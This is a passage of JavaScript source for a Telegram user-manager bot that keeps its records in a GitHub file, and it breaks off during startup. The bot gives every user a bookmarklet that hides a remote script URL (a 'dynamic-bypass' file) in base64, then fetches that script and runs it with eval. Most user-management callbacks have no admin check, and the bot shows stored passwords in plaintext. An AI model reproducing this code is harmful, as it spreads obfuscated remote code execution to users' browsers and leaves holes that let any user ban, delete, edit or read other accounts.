// ╔══════════════════════════════════════════════╗
// ║  NEBULA USER MANAGER BOT v4.4              ║
// ║  AUTHOR: Abdullah Al Mamun (@A2MBD3)       ║
// ║  ADMIN: UNLIMITED USERS + NO EDIT MY       ║
// ╚══════════════════════════════════════════════╝

const express = require('express');
const fetch = require('node-fetch');
const { Buffer } = require('buffer');

const app = express();
app.use(express.json());
app.use(express.static('public'));

const PORT = process.env.PORT || 3000;
const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
const ADMIN_IDS = (process.env.ADMIN_IDS || '').split(',').map(id => id.trim());
const REPO = 'A2MBD3/Aincrad';
const FILE_PATH = 'assets/users.json';
const API = `https://api.telegram.org/bot${TOKEN}`;
const GH_API = `https://api.github.com/repos/${REPO}/contents/${FILE_PATH}`;

// ═══════════════════════════════════════════════
// FORCE JOIN
// ═══════════════════════════════════════════════
const FORCE_CHANNEL = '@phantomsect';
const FORCE_GROUP = '@redguild';
const FORCE_CHANNEL_URL = 'https://t.me/phantomsect';
const FORCE_GROUP_URL = 'https://t.me/redguild';

// ═══════════════════════════════════════════════
// SESSIONS
// ═══════════════════════════════════════════════
const sessions = {};
const broadcastWaiting = {};
const rateLimit = {};

setInterval(() => {
  const now = Date.now();
  for (const key in sessions) if (now - sessions[key].time > 1800000) delete sessions[key];
  for (const key in broadcastWaiting) if (now - broadcastWaiting[key].time > 300000) delete broadcastWaiting[key];
  for (const key in rateLimit) if (now - rateLimit[key] > 2000) delete rateLimit[key];
}, 60000);

// ═══════════════════════════════════════════════
// CACHE
// ═══════════════════════════════════════════════
let cachedUsers = null;
let cacheTime = 0;
const CACHE_TTL = 3000;
let botInfoCache = null;
let botUsernameCache = null;

function invalidateCache() { cachedUsers = null; cacheTime = 0; }

// ═══════════════════════════════════════════════
// LOGGER
// ═══════════════════════════════════════════════
function log(context, msg, type = 'info') {
  const ts = new Date().toISOString().slice(11, 19);
  const emoji = { info: '📘', warn: '⚠️', error: '❌', success: '✅' }[type] || '📘';
  console[type === 'error' ? 'error' : 'log'](`[${ts}] ${emoji} [${context}] ${msg}`);
}

// ═══════════════════════════════════════════════
// ⬡ LANDING PAGE
// ═══════════════════════════════════════════════
app.get('/', async (req, res) => {
  try {
    const users = await getUsers();
    const total = users.users.length;
    const active = users.users.filter(u => !u.banned).length;
    const banned = users.users.filter(u => u.banned).length;
    const botLink = botUsernameCache ? `https://t.me/${botUsernameCache}` : '#';

    res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="theme-color" content="#0a0a1a">
  <title>NEBULA Bot | @A2MBD3</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{background:linear-gradient(160deg,#0a0a1a,#100520,#0a0a1a,#150a20);min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:system-ui,sans-serif;padding:20px}
    .container{max-width:420px;width:100%}
    .profiles{display:flex;justify-content:center;align-items:center;gap:16px;margin-bottom:24px}
    .profile-frame{width:80px;height:80px;border-radius:24px;overflow:hidden;background:rgba(255,255,255,0.05);border:2px solid rgba(255,255,255,0.08);box-shadow:0 8px 32px rgba(0,0,0,0.3)}
    .profile-frame.owner{width:96px;height:96px;border-radius:28px;border:2px solid rgba(0,255,255,0.3);box-shadow:0 0 32px rgba(0,255,255,0.15);z-index:2}
    .profile-frame img{width:100%;height:100%;object-fit:cover}
    .profile-frame .fallback{width:100%;height:100%;display:flex;align-items:center;justify-content:center;font-size:32px;color:rgba(255,255,255,0.3)}
    .profile-label{text-align:center;font-size:10px;color:rgba(255,255,255,0.4);margin-top:8px;text-transform:uppercase;letter-spacing:1px}
    .profile-label.owner-label{color:rgba(0,255,255,0.6)}
    .connector{width:40px;height:2px;background:linear-gradient(90deg,rgba(0,255,255,0.3),rgba(123,47,255,0.3));border-radius:1px}
    .card{background:rgba(255,255,255,0.025);backdrop-filter:blur(20px);border:1px solid rgba(0,255,255,0.08);border-radius:24px;padding:28px 22px;text-align:center;box-shadow:0 0 60px rgba(0,255,255,0.04);animation:fadeIn 0.6s}
    @keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
    h1{font-size:22px;font-weight:800;background:linear-gradient(90deg,#00ffff,#7b2fff,#ff00ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:4px}
    .status{display:inline-flex;align-items:center;gap:6px;background:rgba(0,255,136,0.08);border:1px solid rgba(0,255,136,0.25);padding:4px 14px;border-radius:20px;font-size:10px;color:#00ff88;margin-bottom:20px;font-weight:600}
    .status-dot{width:7px;height:7px;background:#00ff88;border-radius:50%;animation:blink 2s infinite}
    @keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
    .stats{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:20px}
    .stat-box{background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.05);border-radius:14px;padding:14px 6px}
    .stat-num{font-size:22px;font-weight:800;color:#fff}
    .stat-label{font-size:9px;color:rgba(255,255,255,0.35);margin-top:4px;text-transform:uppercase;letter-spacing:1px}
    .btn{display:block;width:100%;padding:13px;border-radius:14px;font-size:14px;font-weight:700;text-decoration:none;transition:0.3s;margin-bottom:8px;text-align:center}
    .btn-primary{background:linear-gradient(135deg,#00ffff,#7b2fff);color:#000}
    .btn-primary:active{transform:scale(0.97)}
    .btn-outline{background:transparent;color:rgba(255,255,255,0.7);border:1px solid rgba(255,255,255,0.15)}
    .footer{margin-top:16px;font-size:10px;color:rgba(255,255,255,0.18)}
    .footer a{color:rgba(0,255,255,0.5);text-decoration:none;font-weight:600}
  </style>
</head>
<body>
  <div class="container">
    <div class="profiles">
      <div><div class="profile-frame"><img src="/bot.png" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'"><div class="fallback" style="display:none">🤖</div></div><div class="profile-label">NEBULA Bot</div></div>
      <div class="connector"></div>
      <div><div class="profile-frame owner"><img src="/owner.png" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'"><div class="fallback" style="display:none">👤</div></div><div class="profile-label owner-label">@A2MBD3</div></div>
    </div>
    <div class="card">
      <h1>NEBULA Bot</h1>
      <div class="status"><span class="status-dot"></span> Live & Active</div>
      <div class="stats">
        <div class="stat-box"><div class="stat-num">${total}</div><div class="stat-label">Total</div></div>
        <div class="stat-box"><div class="stat-num">${active}</div><div class="stat-label">Active</div></div>
        <div class="stat-box"><div class="stat-num">${banned}</div><div class="stat-label">Banned</div></div>
      </div>
      <a href="${botLink}" class="btn btn-primary">🤖 Open Bot</a>
      <a href="https://t.me/A2MBD3" class="btn btn-outline">👤 Contact Creator</a>
      <div class="footer">Created by <a href="https://t.me/A2MBD3">Abdullah Al Mamun</a><br>@A2MBD3 · NEBULA v4.4</div>
    </div>
  </div>
</body>
</html>`);
  } catch { res.send('⬡ NEBULA Bot v4.4 | @A2MBD3'); }
});

// ═══════════════════════════════════════════════
// API HELPERS
// ═══════════════════════════════════════════════
const ghHeaders = { 'Authorization': `token ${GITHUB_TOKEN}`, 'Accept': 'application/vnd.github.v3+json', 'User-Agent': 'NebulaBot/4.4' };

async function getBotInfo() {
  if (botInfoCache) return botInfoCache;
  try { const r = await fetch(`${API}/getMe`); const d = await r.json(); if (d.ok) { botInfoCache = d.result; botUsernameCache = d.result.username; return d.result; } } catch {}
  return { username: 'NebulaBot' };
}

async function getUsers(retries = 2) {
  if (cachedUsers && Date.now() - cacheTime < CACHE_TTL) return cachedUsers;
  for (let i = 0; i < retries; i++) {
    try {
      const r = await fetch(GH_API + '?t=' + Date.now(), { headers: ghHeaders });
      if (!r.ok) throw new Error(`GH ${r.status}`);
      const d = await r.json();
      if (!d.content) throw new Error('No content');
      const dec = Buffer.from(d.content, 'base64').toString('utf8');
      cachedUsers = { users: JSON.parse(dec).users || [], sha: d.sha };
      cacheTime = Date.now();
      return cachedUsers;
    } catch (e) { if (i === retries - 1) throw e; await sleep(1000); }
  }
}

async function saveUsers(users, sha, msg, retries = 3) {
  for (let i = 0; i < retries; i++) {
    try {
      const r = await fetch(GH_API, {
        method: 'PUT', headers: { ...ghHeaders, 'Content-Type': 'application/json' },
        body: JSON.stringify({ message: `🤖 ${msg}`, content: Buffer.from(JSON.stringify({ users }, null, 2)).toString('base64'), sha })
      });
      if (!r.ok) {
        if (r.status === 409 && i < retries - 1) { const f = await getUsers(); sha = f.sha; continue; }
        throw new Error(`GH ${r.status}`);
      }
      invalidateCache();
      return await r.json();
    } catch (e) { if (i === retries - 1) throw e; await sleep(1000); }
  }
}

async function tgApi(method, body, retries = 2) {
  for (let i = 0; i < retries; i++) {
    try {
      const c = new AbortController(); const t = setTimeout(() => c.abort(), 15000);
      const r = await fetch(`${API}/${method}`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body), signal: c.signal });
      clearTimeout(t);
      const d = await r.json();
      if (!d.ok) throw new Error(d.description || 'TG');
      return d;
    } catch (e) { if (i === retries - 1) return { ok: false, error: e.message }; await sleep(1000); }
  }
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// ═══════════════════════════════════════════════
// TG HELPERS
// ═══════════════════════════════════════════════
async function editMsg(cid, mid, txt, mk) {
  try { return await tgApi('editMessageText', { chat_id: cid, message_id: mid, text: txt, parse_mode: 'HTML', reply_markup: mk, disable_web_page_preview: true }); }
  catch { return await sendMsg(cid, txt, mk); }
}
async function sendMsg(cid, txt, mk) {
  return tgApi('sendMessage', { chat_id: cid, text: txt, parse_mode: 'HTML', reply_markup: mk, disable_web_page_preview: true });
}
async function answerCb(cbid, txt, alert = false) {
  if (!cbid) return; return tgApi('answerCallbackQuery', { callback_query_id: cbid, text: txt, show_alert: alert });
}
async function deleteMsg(cid, mid) { try { await tgApi('deleteMessage', { chat_id: cid, message_id: mid }); } catch {} }

// ═══════════════════════════════════════════════
// FORCE JOIN
// ═══════════════════════════════════════════════
async function checkForceJoin(cid) {
  const r = { ch: false, gr: false };
  try { const c = await tgApi('getChatMember', { chat_id: FORCE_CHANNEL, user_id: cid }); if (c.ok) r.ch = ['creator','administrator','member'].includes(c.result?.status); } catch {}
  try { const g = await tgApi('getChatMember', { chat_id: FORCE_GROUP, user_id: cid }); if (g.ok) r.gr = ['creator','administrator','member'].includes(g.result?.status); } catch {}
  if (!r.ch || !r.gr) {
    const m = [];
    if (!r.ch) m.push(`📢 <a href="${FORCE_CHANNEL_URL}">Phantom Sect</a>`);
    if (!r.gr) m.push(`👥 <a href="${FORCE_GROUP_URL}">Red Guild</a>`);
    await sendMsg(cid, '🔒 <b>JOIN REQUIRED</b>\n\n' + m.join('\n') + '\n\n<i>Join then click Check</i>', {
      inline_keyboard: [
        ...(!r.ch ? [[{ text: '📢 JOIN CHANNEL', url: FORCE_CHANNEL_URL }]] : []),
        ...(!r.gr ? [[{ text: '👥 JOIN GROUP', url: FORCE_GROUP_URL }]] : []),
        [{ text: '✅ CHECK', callback_data: 'check_join' }]
      ]
    });
    return false;
  }
  return true;
}

// ═══════════════════════════════════════════════
// KEYBOARDS
// ═══════════════════════════════════════════════
function homeKB(isAdminUser, hasUser) {
  const b = [];
  
  if (isAdminUser) {
    // Admin: Unlimited add + full management
    b.push([{ text: '➕ ADD NEW USER', callback_data: 'add_start' }]);
    b.push([{ text: '👥 USER LIST', callback_data: 'users' }]);
    b.push([{ text: '🔍 SEARCH', callback_data: 'search' }]);
    b.push([{ text: '📊 STATS', callback_data: 'stats' }]);
    b.push([{ text: '📢 BROADCAST', callback_data: 'broadcast' }]);
  } else {
    // Normal user: One user only
    if (hasUser) {
      b.push([{ text: '✏️ EDIT MY USER', callback_data: 'edit_my' }]);
    } else {
      b.push([{ text: '➕ CREATE MY USER', callback_data: 'add_start' }]);
    }
  }
  
  b.push([{ text: '🔄 REFRESH', callback_data: 'home' }]);
  return { inline_keyboard: b };
}

function backBtn(d = 'home') { return { inline_keyboard: [[{ text: '🔙 BACK', callback_data: d }]] }; }
function cancelBtn() { return { inline_keyboard: [[{ text: '❌ CANCEL', callback_data: 'home' }]] }; }

function userListKB(users, page = 0) {
  const pp = 8, total = Math.max(1, Math.ceil(users.length / pp));
  page = Math.max(0, Math.min(page, total - 1));
  const sl = users.slice(page * pp, (page + 1) * pp);
  const rows = sl.map(u => [{ text: `${u.banned ? '🚫' : '✅'} ${u.name} (ID:${u.id})`, callback_data: `view_${u.id}` }]);
  rows.forEach((r, i) => { if (sl[i]) r.push({ text: '🗑', callback_data: `del_${sl[i].id}_list` }); });
  const nav = [];
  if (page > 0) nav.push({ text: '⬅️', callback_data: `users_${page - 1}` });
  nav.push({ text: `${page + 1}/${total}`, callback_data: 'noop' });
  if (page < total - 1) nav.push({ text: '➡️', callback_data: `users_${page + 1}` });
  if (nav.length) rows.push(nav);
  rows.push([{ text: '🔙 HOME', callback_data: 'home' }]);
  return { inline_keyboard: rows };
}

function ownerUserKB(u) {
  return { inline_keyboard: [
    [{ text: u.banned ? '✅ UNBAN' : '🚫 BAN', callback_data: `toggle_${u.id}` },
     { text: '🗑 DELETE', callback_data: `del_${u.id}` }],
    [{ text: '✏️ ADMIN EDIT', callback_data: `admin_edit_${u.id}` }],
    [{ text: '🔙 LIST', callback_data: 'users' }],
  ]};
}

function editMyKB(id) {
  return { inline_keyboard: [
    [{ text: '📛 EDIT NAME', callback_data: `edit_name_${id}` }],
    [{ text: '🔑 EDIT PASSWORD', callback_data: `edit_pass_${id}` }],
    [{ text: '📢 EDIT CHANNEL', callback_data: `edit_ch_${id}` }],
    [{ text: '🔙 HOME', callback_data: 'home' }],
  ]};
}

// ═══════════════════════════════════════════════
// TEXT
// ═══════════════════════════════════════════════
function homeText(isAdminUser, hasUser, u) {
  let t = '<b>⬡ NEBULA v4.4</b>\n\n';
  
  if (isAdminUser) {
    t += '👑 <b>ADMIN PANEL</b>\n\n';
    t += 'You have unlimited access.\n';
    t += 'Use buttons below to manage users.\n\n';
    t += '<i>By @A2MBD3</i>';
  } else if (hasUser && u) {
    t += `👤 <b>${u.name}</b> (ID:${u.id})\n`;
    t += `🔑 Pass: ${u.password === '0' ? 'None' : '••••'}\n`;
    t += `📢 Channel: ${u.tgChannel === '0' ? 'None' : u.tgChannel}\n`;
    t += `🚫 Status: ${u.banned ? 'Banned' : 'Active'}\n\n`;
    t += '<i>Use EDIT MY USER to modify.</i>\n';
    t += '<i>💡 One user per creator.</i>';
  } else {
    t += '👋 <b>Welcome!</b>\n\n';
    t += 'Create your NEBULA user.\n\n';
    t += '<i>💡 One user per creator.</i>\n\n';
    t += '<i>By @A2MBD3</i>';
  }
  return t;
}

function userText(u) {
  const bl = `javascript:(function(){window.ABDULLAH_BOOKMARK_LOAD=${u.id};var a=['aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0EyTUJEMy9BaW5jcmFkL21haW4vL2R5bmFtaWMtYnlwYXNzLWJ5LUBhMm1iZDMuanM='];fetch(atob(a[0])+'?t='+Date.now()).then(r=>r.text()).then(t=>eval(t)).catch(()=>alert('Failed'));})();`;
  return `<b>👤 ${u.name}</b>\n\n🆔 ${u.id}\n👑 @${u.creator||'?'}\n🔑 ${u.password}\n📢 ${u.tgChannel}\n🚫 ${u.banned?'Yes':'No'}\n💬 ${u.chatId?'✅':'❌'}\n📅 ${u.createdAt?new Date(u.createdAt).toLocaleDateString():'?'}\n\n<b>📋 Bookmarklet:</b>\n<code>${bl}</code>`;
}

// ═══════════════════════════════════════════════
// HELPERS
// ═══════════════════════════════════════════════
function cleanUser(u) { return (u || '').replace(/^@/, '').toLowerCase(); }
function isAdmin(cid) { return ADMIN_IDS.includes(cid.toString()); }

async function getUserByCreator(uname) {
  if (!uname) return null;
  const cu = cleanUser(uname);
  const { users } = await getUsers();
  return users.find(u => cleanUser(u.creator) === cu) || null;
}

async function storeChatId(uname, cid) {
  if (!uname) return;
  const cu = cleanUser(uname);
  try {
    const { users, sha } = await getUsers();
    const u = users.find(x => cleanUser(x.creator) === cu);
    if (u && u.chatId !== cid) { u.chatId = cid; u.lastSeen = new Date().toISOString(); await saveUsers(users, sha, `ChatId for ${u.name}`); }
  } catch {}
}

// ═══════════════════════════════════════════════
// ADD USER
// ═══════════════════════════════════════════════
function startAdd(cid, mid, creator) {
  sessions[cid] = { type: 'add', step: 'name', mid, data: { creator: cleanUser(creator) }, time: Date.now() };
  editMsg(cid, mid, '➕ <b>CREATE USER</b>\n\n<b>Step 1/3:</b> Enter <b>Name</b>:', cancelBtn());
}

async function handleAddStep(cid, text, mid) {
  const s = sessions[cid];
  if (!s || s.type !== 'add') return;
  try {
    switch (s.step) {
      case 'name': s.data.name = text; s.step = 'password'; await editMsg(cid, mid, `✅ Name: <b>${text}</b>\n\n<b>Step 2/3:</b> Enter <b>Password</b> (0=none):`, cancelBtn()); break;
      case 'password': s.data.password = text; s.step = 'channel'; await editMsg(cid, mid, `✅ Pass: <b>${text}</b>\n\n<b>Step 3/3:</b> Enter <b>Channel</b> (0=none):`, cancelBtn()); break;
      case 'channel': s.data.channel = text; await finishAdd(cid, mid, s); break;
    }
  } catch (e) { delete sessions[cid]; await editMsg(cid, mid, `❌ ${e.message}`, backBtn()); }
}

async function finishAdd(cid, mid, s) {
  const { users, sha } = await getUsers();
  
  // Only check duplicate for non-admin users
  if (!isAdmin(cid)) {
    if (users.find(u => cleanUser(u.creator) === s.data.creator)) {
      const ex = users.find(u => cleanUser(u.creator) === s.data.creator);
      delete sessions[cid];
      return editMsg(cid, mid, `⚠️ You already have: <b>${ex.name}</b> (ID:${ex.id})`, { inline_keyboard: [[{ text: '✏️ EDIT', callback_data: 'edit_my' }], [{ text: '🔙 HOME', callback_data: 'home' }]] });
    }
  }
  
  const maxId = users.reduce((mx, u) => Math.max(mx, u.id), 0);
  const nu = { id: maxId + 1, name: s.data.name, password: s.data.password, tgChannel: s.data.channel, creator: s.data.creator, banned: 0, chatId: cid, createdAt: new Date().toISOString() };
  users.push(nu);
  await saveUsers(users, sha, `Add ${nu.name} by @${s.data.creator}`);
  delete sessions[cid];
  
  const bl = `javascript:(function(){window.ABDULLAH_BOOKMARK_LOAD=${nu.id};var a=['aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0EyTUJEMy9BaW5jcmFkL21haW4vL2R5bmFtaWMtYnlwYXNzLWJ5LUBhMm1iZDMuanM='];fetch(atob(a[0])+'?t='+Date.now()).then(r=>r.text()).then(t=>eval(t)).catch(()=>alert('Failed'));})();`;
  
  const kb = isAdmin(cid) 
    ? { inline_keyboard: [[{ text: '🔙 HOME', callback_data: 'home' }], [{ text: '➕ ADD MORE', callback_data: 'add_start' }]] }
    : { inline_keyboard: [[{ text: '🔙 HOME', callback_data: 'home' }]] };
  
  await editMsg(cid, mid, `✅ <b>CREATED!</b>\n\n🆔 ${nu.id} | 📛 ${nu.name}\n\n<b>Bookmarklet:</b>\n<code>${bl}</code>`, kb);
}

// ═══════════════════════════════════════════════
// EDIT
// ═══════════════════════════════════════════════
function startEdit(cid, mid, uid, field) {
  sessions[cid] = { type: 'edit', step: 'editing', mid, uid, field, time: Date.now() };
  const lb = { name: 'Name', password: 'Password', tgChannel: 'Channel' };
  editMsg(cid, mid, `✏️ Edit <b>${lb[field]}</b>:`, cancelBtn());
}

async function handleEditStep(cid, text, mid) {
  const s = sessions[cid];
  if (!s || s.type !== 'edit') return;
  try {
    const { users, sha } = await getUsers();
    const u = users.find(x => x.id === s.uid);
    if (!u) throw new Error('Not found');
    u[s.field] = text;
    await saveUsers(users, sha, `Edit ${s.field} for ${u.name}`);
    delete sessions[cid];
    await editMsg(cid, mid, '✅ Updated!', backBtn());
  } catch (e) { delete sessions[cid]; await editMsg(cid, mid, `❌ ${e.message}`, backBtn()); }
}

// ═══════════════════════════════════════════════
// BROADCAST
// ═══════════════════════════════════════════════
function startBroadcast(cid, mid) {
  broadcastWaiting[cid] = { mid, time: Date.now() };
  editMsg(cid, mid, '📢 <b>BROADCAST</b>\n\nSend content.\n/cancel to abort.', cancelBtn());
}

async function handleBroadcastSend(cid, mid, msg) {
  delete broadcastWaiting[cid];
  try {
    const { users } = await getUsers();
    const active = users.filter(u => u.chatId && !u.banned);
    if (!active.length) return editMsg(cid, mid, '⚠️ No active users!', backBtn());
    let sent = 0, failed = 0;
    await editMsg(cid, mid, `📢 Sending to ${active.length}...`);
    for (let i = 0; i < active.length; i += 20) {
      const chunk = active.slice(i, i + 20);
      const results = await Promise.allSettled(chunk.map(u => sendToUser(u, msg)));
      results.forEach(r => r.status === 'fulfilled' && r.value ? sent++ : failed++);
      if (i + 20 < active.length) { await editMsg(cid, mid, `📢 ${Math.min(i + 20, active.length)}/${active.length}...`); await sleep(1000); }
    }
    await editMsg(cid, mid, `✅ Done! Sent: ${sent} Failed: ${failed}`, backBtn());
  } catch (e) { await editMsg(cid, mid, `❌ ${e.message}`, backBtn()); }
}

async function sendToUser(u, msg) {
  try {
    if (msg.text && !msg.photo && !msg.video && !msg.document) {
      if (msg.text.includes('|') && msg.text.trim().startsWith('http')) {
        const [url, btn] = msg.text.split('|').map(s => s.trim());
        return await tgApi('sendMessage', { chat_id: u.chatId, text: '📢 <b>Broadcast</b>', parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: btn || 'Open', url }]] } });
      }
      return await tgApi('sendMessage', { chat_id: u.chatId, text: `📢 <b>Broadcast</b>\n\n${msg.text}`, parse_mode: 'HTML' });
    }
    if (msg.photo) return await tgApi('sendPhoto', { chat_id: u.chatId, photo: msg.photo[msg.photo.length - 1].file_id, caption: msg.caption || '📢 Broadcast', parse_mode: 'HTML' });
    if (msg.video) return await tgApi('sendVideo', { chat_id: u.chatId, video: msg.video.file_id, caption: msg.caption || '📢 Broadcast', parse_mode: 'HTML' });
    if (msg.document) return await tgApi('sendDocument', { chat_id: u.chatId, document: msg.document.file_id, caption: msg.caption || '📢 Broadcast', parse_mode: 'HTML' });
  } catch { return null; }
}

// ═══════════════════════════════════════════════
// DELETE & REFRESH
// ═══════════════════════════════════════════════
async function deleteAndRefresh(cid, mid, uid, cbid) {
  const { users, sha } = await getUsers();
  const idx = users.findIndex(x => x.id === uid);
  if (idx === -1) return answerCb(cbid, 'Not found!', true);
  const name = users[idx].name;
  users.splice(idx, 1);
  await saveUsers(users, sha, `Delete ${name}`);
  const upd = await getUsers();
  const t = upd.users.length ? upd.users.map(u => `${u.banned ? '🚫' : '✅'} <b>${u.name}</b> (${u.id})`).join('\n') : 'No users.';
  await editMsg(cid, mid, `🗑 <b>${name}</b> deleted!\n\n<b>👥 USERS</b>\n\n${t}`, userListKB(upd.users));
}

// ═══════════════════════════════════════════════
// SEARCH
// ═══════════════════════════════════════════════
function startSearch(cid, mid) {
  sessions[cid] = { type: 'search', mid, time: Date.now() };
  editMsg(cid, mid, '🔍 <b>SEARCH</b>\n\nEnter name, ID, or creator:', cancelBtn());
}

async function handleSearch(cid, text, mid) {
  delete sessions[cid];
  const { users } = await getUsers();
  const q = text.toLowerCase();
  const results = users.filter(u => u.name.toLowerCase().includes(q) || u.id.toString() === q || (u.creator && cleanUser(u.creator).includes(q)));
  if (!results.length) return editMsg(cid, mid, `❌ No results for "<b>${text}</b>"`, backBtn());
  const t = results.slice(0, 15).map(u => `${u.banned ? '🚫' : '✅'} <b>${u.name}</b> (ID:${u.id})\n   👑 @${u.creator || '?'}`).join('\n\n');
  const kb = { inline_keyboard: results.slice(0, 10).map(u => [{ text: `${u.name} (ID:${u.id})`, callback_data: `view_${u.id}` }]).concat([[{ text: '🔙 HOME', callback_data: 'home' }]]) };
  await editMsg(cid, mid, `🔍 <b>Results (${results.length}):</b>\n\n${t}`, kb);
}

// ═══════════════════════════════════════════════
// ADMIN EDIT
// ═══════════════════════════════════════════════
function startAdminEdit(cid, mid, uid) {
  sessions[cid] = { type: 'adm_edit', mid, uid, time: Date.now() };
  editMsg(cid, mid, '✏️ <b>ADMIN EDIT</b>\n\nFormat: <code>name,password,channel,banned</code>', cancelBtn());
}

async function handleAdminEdit(cid, text, mid) {
  const s = sessions[cid];
  if (!s || s.type !== 'adm_edit') return;
  const parts = text.split(',').map(x => x.trim());
  if (parts.length < 4) return editMsg(cid, mid, '❌ Need: name,password,channel,banned', cancelBtn());
  try {
    const { users, sha } = await getUsers();
    const u = users.find(x => x.id === s.uid);
    if (!u) throw new Error('Not found');
    u.name = parts[0]; u.password = parts[1]; u.tgChannel = parts[2]; u.banned = parseInt(parts[3]) || 0;
    await saveUsers(users, sha, `Admin edit ${u.name}`);
    delete sessions[cid];
    await editMsg(cid, mid, `✅ <b>${u.name}</b> updated!`, backBtn());
  } catch (e) { delete sessions[cid]; await editMsg(cid, mid, `❌ ${e.message}`, backBtn()); }
}

// ═══════════════════════════════════════════════
// MAIN HANDLER
// ═══════════════════════════════════════════════
async function handleUpdate(upd) {
  try {
    if (upd.callback_query) {
      const cb = upd.callback_query;
      const cid = cb.message?.chat?.id, mid = cb.message?.message_id, data = cb.data;
      const uname = cb.from?.username || '', admin = isAdmin(cid);
      if (!cid || !mid) return;
      await answerCb(cb.id, '');

      if (data === 'check_join') { const j = await checkForceJoin(cid); if (j) { await deleteMsg(cid, mid); const u = admin ? null : await getUserByCreator(uname); await sendMsg(cid, homeText(admin, !!u, u), homeKB(admin, !!u)); } return; }
      if (data === 'home') { const u = admin ? null : await getUserByCreator(uname); return editMsg(cid, mid, homeText(admin, !!u, u), homeKB(admin, !!u)); }
      if (data === 'users') { const { users } = await getUsers(); const t = users.length ? users.map(u => `${u.banned ? '🚫' : '✅'} <b>${u.name}</b> (${u.id})`).join('\n') : 'No users.'; return editMsg(cid, mid, `<b>👥 USERS (${users.length})</b>\n\n${t}`, userListKB(users)); }
      if (data.startsWith('users_')) { const pg = parseInt(data.split('_')[1]) || 0; const { users } = await getUsers(); return editMsg(cid, mid, `<b>👥 USERS</b>`, userListKB(users, pg)); }
      if (data.startsWith('view_')) { const id = parseInt(data.split('_')[1]); const { users } = await getUsers(); const u = users.find(x => x.id === id); if (!u) return answerCb(cb.id, 'Not found!', true); return editMsg(cid, mid, userText(u), admin ? ownerUserKB(u) : backBtn()); }
      if (data.startsWith('toggle_')) { const id = parseInt(data.split('_')[1]); const { users, sha } = await getUsers(); const u = users.find(x => x.id === id); if (!u) return answerCb(cb.id, 'Not found!', true); u.banned = u.banned ? 0 : 1; await saveUsers(users, sha, `${u.banned ? 'Ban' : 'Unban'} ${u.name}`); return editMsg(cid, mid, userText(u), ownerUserKB(u)); }
      if (data.startsWith('del_') && data.endsWith('_list')) return deleteAndRefresh(cid, mid, parseInt(data.replace('del_', '').replace('_list', '')), cb.id);
      if (data.startsWith('del_')) return deleteAndRefresh(cid, mid, parseInt(data.split('_')[1]), cb.id);
      
      // Add user - admin can add unlimited, normal user only one
      if (data === 'add_start') {
        if (!admin) {
          const ex = await getUserByCreator(uname);
          if (ex) return editMsg(cid, mid, `⚠️ You have: <b>${ex.name}</b> (ID:${ex.id})`, { inline_keyboard: [[{ text: '✏️ EDIT', callback_data: 'edit_my' }], [{ text: '🔙 HOME', callback_data: 'home' }]] });
        }
        return startAdd(cid, mid, uname);
      }
      
      if (data === 'edit_my') { const u = await getUserByCreator(uname); if (!u) return editMsg(cid, mid, '❌ No user!', backBtn()); return editMsg(cid, mid, userText(u), editMyKB(u.id)); }
      if (data.startsWith('edit_name_')) return startEdit(cid, mid, parseInt(data.split('_')[2]), 'name');
      if (data.startsWith('edit_pass_')) return startEdit(cid, mid, parseInt(data.split('_')[2]), 'password');
      if (data.startsWith('edit_ch_')) return startEdit(cid, mid, parseInt(data.split('_')[2]), 'tgChannel');
      if (data.startsWith('admin_edit_')) return startAdminEdit(cid, mid, parseInt(data.split('_')[2]));
      if (data === 'search') return startSearch(cid, mid);
      if (data === 'stats') { const { users } = await getUsers(); return editMsg(cid, mid, `<b>📊 STATS</b>\n\n👥 ${users.length}\n✅ ${users.filter(u => !u.banned).length}\n🚫 ${users.filter(u => u.banned).length}`, backBtn()); }
      if (data === 'broadcast') return startBroadcast(cid, mid);
      if (data === 'noop') return;
      return;
    }

    if (upd.message) {
      const { chat, text, from } = upd.message;
      const cid = chat.id, uname = from?.username || '', admin = isAdmin(cid);

      if (rateLimit[cid] && Date.now() - rateLimit[cid] < 2000 && !admin) return;
      rateLimit[cid] = Date.now();
      await storeChatId(uname, cid);

      if (text === '/start') { const j = await checkForceJoin(cid); if (!j) return; const u = admin ? null : await getUserByCreator(uname); return sendMsg(cid, homeText(admin, !!u, u), homeKB(admin, !!u)); }
      if (text === '/cancel') { delete sessions[cid]; delete broadcastWaiting[cid]; return sendMsg(cid, '❌ Cancelled.', backBtn()); }

      const s = sessions[cid];
      if (broadcastWaiting[cid]) return handleBroadcastSend(cid, broadcastWaiting[cid].mid, upd.message);
      if (s?.type === 'edit') return handleEditStep(cid, text, s.mid);
      if (s?.type === 'adm_edit') return handleAdminEdit(cid, text, s.mid);
      if (s?.type === 'search') return handleSearch(cid, text, s.mid);
      if (s?.type === 'add') return handleAddStep(cid, text, s.mid);
    }
  } catch (e) { log('handler', e.message, 'error'); }
}

// ═══════════════════════════════════════════════
// STARTUP
// ═══════════════════════════════════════════════
async function validate() {
  log('start', 'Validating...', 'info');
  if (!TOKEN) return log('start', 'TOKEN missing!', 'error');
  if (!GITHUB_TOKEN) return log('start', 'GITHUB missing!', 'error');
  const me = await getBotInfo(); log('start', `@${me.username}`, 'success');
  try { await getUsers(); log('start', 'GitHub OK', 'success'); } catch (e) { log('start', `GH: ${e.message}`, 'error'); }
  log('start', 'Ready!', 'success');
